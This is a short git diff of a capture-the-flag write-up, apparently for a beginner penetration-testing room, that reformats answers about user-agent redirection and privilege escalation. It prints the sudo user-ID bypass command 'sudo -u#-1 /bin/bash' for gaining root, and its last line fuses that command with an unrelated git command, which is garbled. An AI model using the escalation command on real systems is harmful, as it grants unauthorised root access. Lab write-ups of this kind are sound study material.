@@ -40,9 +40,8 @@ Nmap done: 1 IP address (1 host up) scanned in 11.12 seconds
 
 2. How you redirect yourself to a secret page? 
 
-```
-Use your own codename as user-agent to access the site 
-```
+
+> Use your own codename as user-agent to access the site 
 
 3. What is the agent name? 
 
@@ -205,7 +204,5 @@ Explanation:
 https://www.exploit-db.com/exploits/47502
 
 2. Priv esc 
-> sudo -u#-1 /bin/bash
-
-
+> sudo -u#-1 /bin/bashgit rm --cached learning_paths/jr_pen_tester/shells/windows-php-reverse-shell
 
